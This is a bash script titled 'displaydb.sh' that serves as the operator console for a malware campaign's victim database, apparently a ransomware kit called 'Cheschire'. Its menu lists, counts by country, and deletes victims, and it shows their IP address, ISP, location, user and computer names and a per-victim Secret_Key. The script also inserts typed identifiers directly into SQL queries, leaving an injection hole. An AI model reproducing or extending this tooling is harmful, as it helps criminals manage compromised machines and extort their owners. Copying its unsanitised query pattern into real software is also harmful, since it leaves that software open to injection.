#!/bin/bash
#coding:utf-8
#title:displaydb.sh
#author:hacknonym
#launch:./displaydb.sh

#MySQL credentials
DATABASE_NAME=$(cat ident.txt | grep -e "DBNAME" | cut -d ' ' -f 2)
MYSQL_USER=$(cat ident.txt | grep -e "USERNAME" | cut -d ' ' -f 2)
MYSQL_PASS=$(cat ident.txt | grep -e "PASSWORD" | cut -d ' ' -f 2)

while [ true ] ; do

	clear
	echo -e """┌──────────────────────┐
│  Cheschire DataBase  │
└──────────────────────┘
 0 - Delete all victims
 1 - Display all information of all victims by date
 2 - Display all information of all victims using the identifier
 3 - Display the number of victims by country
 4 - Display the number of victims in totality
 5 - Display essential information from all victims
 6 - Display essential information using the identifier
 7 - Display country name using the code
 8 - Delete a victim using the identifier
 9 - Enter your SQL request
"""
  read -p " > " -n 1 -e option

  case $option in

    0 )
      read -p "Confirm to delete all victims in the database (Y/n) > " -n 1 -e confirm
      if [[ "$confirm" =~ ^[YyOo]$ ]] ; then
        mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME --batch -e "DELETE FROM Victim;"
      fi;;

    1 )
      mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "SELECT DATE_FORMAT(Date_Compromise, \"%a %d %b %Y à %H:%i\") AS \"Date of compromise\", IP_Address, ISP, Country, Region, City, Timezone, User_Name, Computer_Name, Ident, Secret_Key FROM Victim ORDER BY Date_Compromise DESC;"
      read -p "Push ENTER to continue" enter;;

    2 )
      read -p "Identifier > " -n 17 -e identifier
      mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "SELECT DATE_FORMAT(Date_Compromise, \"%a %d %b %Y à %H:%i\") AS \"Date of compromise\", IP_Address, ISP, Country, Region, City, Timezone, User_Name, Computer_Name, Ident, Secret_Key FROM Victim WHERE Ident = '$identifier';"
      read -p "Push ENTER to continue" enter;;

    3 )
      mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "SELECT COUNT(V.Country) AS \"Nb Victims\", C.Name AS \"Country\" FROM Victim AS V, Country AS C WHERE V.Country = C.Id_Country GROUP BY V.Country;"
      read -p "Push ENTER to continue" enter;;

    4 )
      echo -n "Total de victimes : "
      mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME --batch -e "SELECT COUNT(*) AS \"Tot Nb Victims\" FROM Victim;" | sed -n '2 p'
      read -p "Push ENTER to continue" enter;;

    5 )
      mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "SELECT DATE_FORMAT(Date_Compromise, \"%a %d %b %Y à %H:%i\") AS \"Date of compromise\", Ident, Secret_Key FROM Victim;"
      read -p "Push ENTER to continue" enter;;

    6 )
      read -p "Identifier > " -n 17 -e identifier
      mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "SELECT DATE_FORMAT(Date_Compromise, \"%a %d %b %Y à %H:%i\") AS \"Date of compromise\", Ident, Secret_Key FROM Victim WHERE Ident = '$identifier';"
      read -p "Push ENTER to continue" enter;;

    7 )
      echo -n "Country Code"
      read -p " > " -n 2 -e country_code
      echo -en "\033[1A"
      request=$(mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME --batch -e "SELECT Name FROM Country WHERE Id_Country = '$country_code';" | sed -n '2 p')
      echo -e "Country Code : $request"
      read -p "Push ENTER to continue" enter;;

    8 )
      read -p "Identifier > " -n 17 -e identifier
      mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME --batch -e "DELETE FROM Victim WHERE Ident = '$identifier';";;

    9 ) 
		echo -e "TABLE 'Victim'"
		mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "DESCRIBE Victim;"
		echo -e "TABLE 'Country'"
		mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "DESCRIBE Country;"
		echo -e "\ne.g. SELECT COUNT(V.Country) AS \"Nb Victims\", C.Name AS \"Country\"    \\"
		echo -e "     FROM Victim AS V, Country AS C    \\"
		echo -e "     WHERE V.Country = C.Id_Country    \\"
		echo -e "     GROUP BY V.Country;\n"
		read -p "Request > " -e request
		mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "$request"
		read -p "Push ENTER to continue" enter;;

    * ) echo -e "Error" && sleep 2;;
  esac
done
